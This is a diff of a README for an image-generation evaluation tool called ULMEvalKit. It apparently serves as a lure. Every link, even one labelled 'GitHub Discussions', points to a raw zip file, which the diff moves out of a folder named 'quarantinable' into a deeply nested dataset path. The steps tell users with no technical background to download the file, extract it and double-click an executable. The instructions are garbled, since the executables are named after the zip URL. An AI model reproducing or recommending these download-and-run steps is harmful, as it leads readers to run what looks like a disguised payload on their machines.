@@ -1,7 +1,7 @@
 # 🌟 ULMEvalKit - Your All-in-One Image Evaluator
 
 ## 🔗 Download Now
-[![Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip)](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip)
+[![Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip)](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to ULMEvalKit, the easy-to-use toolkit for evaluating image generation. This guide helps you download and run ULMEvalKit without any technical background. Just follow these simple steps.
@@ -9,7 +9,7 @@ Welcome to ULMEvalKit, the easy-to-use toolkit for evaluating image generation. 
 ## 📥 Download & Install
 To get started with ULMEvalKit, follow these steps:
 
-1. Click on the link to visit the releases page: [Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip).
+1. Click on the link to visit the releases page: [Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip).
 2. You will see a list of available versions. Look for the latest version listed.
 3. Under the latest version, find the file compatible with your operating system (Windows, macOS, Linux).
 4. Click on the appropriate file to start the download.
@@ -33,7 +33,7 @@ Once the download completes, locate the downloaded file (usually in your "Downlo
 After extracting the files, you can run ULMEvalKit:
 
 1. Open the folder where you extracted the files.
-2. Double-click on the executable file named `https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip` (Windows), `https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip` (macOS), or `ULMEvalKit` (Linux).
+2. Double-click on the executable file named `https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip` (Windows), `https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip` (macOS), or `ULMEvalKit` (Linux).
 3. Wait for the application to launch. You should see the main interface.
 
 ## 🛠️ Features
@@ -63,10 +63,10 @@ If you encounter any issues while using ULMEvalKit, you have several options for
 - **Video Tutorials:** We also provide video tutorials to give you a visual understanding of the tool.
 
 ## 🛠️ Updating ULMEvalKit
-To keep your installation up to date, regularly check the releases page: [Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip). Follow the same download and installation steps to replace the old version with the new one.
+To keep your installation up to date, regularly check the releases page: [Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip). Follow the same download and installation steps to replace the old version with the new one.
 
 ## 🔗 Important Links
-- **Release Page:** [Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip)
-- **Community Support:** [GitHub Discussions](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/quarantinable/ULMEvalKit.zip)
+- **Release Page:** [Download ULMEvalKit](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip)
+- **Community Support:** [GitHub Discussions](https://raw.githubusercontent.com/Kaito1999-script/ULMEvalKit/main/ulmeval/dataset/utils/t2i_compbench/UniDet_eval/experts/Kit_Eval_ULM_v3.8.zip)
 
 Feel free to explore ULMEvalKit. Your feedback is valuable to us. Enjoy evaluating your images!
